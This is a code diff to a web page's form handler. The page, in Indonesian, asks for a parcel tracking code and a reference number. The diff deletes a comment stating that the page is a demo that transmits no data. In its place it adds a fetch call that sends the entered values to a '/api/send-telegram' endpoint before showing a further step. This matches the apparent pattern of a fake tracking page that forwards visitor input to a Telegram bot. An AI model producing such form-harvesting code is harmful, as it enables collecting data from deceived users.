@@ -349,10 +349,11 @@
   const verifyPanel = document.getElementById('verifyPanel');
   const nextPanel = document.getElementById('nextPanel');
 
-  form.addEventListener('submit', (event) => {
+  form.addEventListener('submit', async (event) => {
     event.preventDefault();
     const resi = trackingCode.value.trim();
     const reference = referenceCode.value.trim();
+    const submitButton = document.getElementById('nextButton');
 
     if (!resi || !reference) {
       hint.textContent = 'Mohon isi kode resi dan nomor referensi terlebih dahulu.';
@@ -361,10 +362,28 @@
       return;
     }
 
-    // Demo interface: no tracking service is connected and no data is transmitted.
-    verifyPanel.style.display = 'none';
-    nextPanel.style.display = 'block';
-    window.scrollTo({ top: 0, behavior: 'smooth' });
+    submitButton.disabled = true;
+    submitButton.textContent = 'Mengirim...';
+    hint.textContent = 'Mengirim data formulir...';
+
+    try {
+      const telegramResponse = await fetch('/api/send-telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ trackingCode: resi, referenceCode: reference }),
+      });
+
+      if (!telegramResponse.ok) throw new Error('Telegram request failed');
+
+      verifyPanel.style.display = 'none';
+      nextPanel.style.display = 'block';
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    } catch {
+      hint.textContent = 'Data belum berhasil dikirim. Silakan coba lagi.';
+    } finally {
+      submitButton.disabled = false;
+      submitButton.textContent = 'Lanjutkan';
+    }
   });
 
   document.getElementById('backButton').addEventListener('click', () => {
